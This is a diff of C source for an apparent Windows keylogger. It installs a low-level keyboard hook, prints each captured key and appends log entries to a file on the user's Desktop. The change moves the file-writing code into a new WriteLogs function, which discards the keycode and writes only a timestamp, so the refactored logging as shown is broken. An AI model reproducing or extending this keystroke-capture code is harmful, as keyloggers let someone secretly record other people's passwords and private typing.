@@ -14,6 +14,38 @@ typedef struct tagKBDLLHOOKSTRUCT {
 https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
 */
 
+/// time - 'window'
+void    WriteLogs(DWORD vkCode)
+{
+    UNREFERENCED_PARAMETER(vkCode);
+
+    HANDLE  hFile = CreateFile(
+        "C:\\Users\\r4mnesia\\Desktop\\log.txt",
+        GENERIC_WRITE,
+        0,
+        NULL,
+        OPEN_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
+
+    if (hFile == INVALID_HANDLE_VALUE)
+    {
+        printf("CreateFile error: %lu\n", GetLastError());
+        return ;
+    }
+    
+    // set pointer at the end of file for write
+    SetFilePointer(hFile, 0, NULL, FILE_END);
+
+    char    *log = FormatLogTime();
+    DWORD   written;
+
+    WriteFile(hFile, log, strlen(log), &written, NULL);
+    free(log);
+    CloseHandle(hFile);
+}
+
 LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
 {
     KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *)lParam;
@@ -48,25 +80,7 @@ LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
             default:
                 kCode = pkey->vkCode;
                 printf("%c", (char)pkey->vkCode);
-                HANDLE  hFile = CreateFile(
-                    "C:\\Users\\r4mnesia\\Desktop\\log.txt",
-                    GENERIC_WRITE,
-                    0,
-                    NULL,
-                    OPEN_ALWAYS,
-                    FILE_ATTRIBUTE_NORMAL,
-                    NULL
-                );
-            
-                if (hFile == INVALID_HANDLE_VALUE) {
-                    printf("CreateFile error: %lu\n", GetLastError());
-                    // return NULL;
-                }
-                char    c = (char)pkey->vkCode;
-                DWORD   written;
-
-                WriteFile(hFile, &c, 1, &written, NULL);
-                CloseHandle(hFile);
+                WriteLogs(pkey->vkCode);
                 break ;
         }
     }
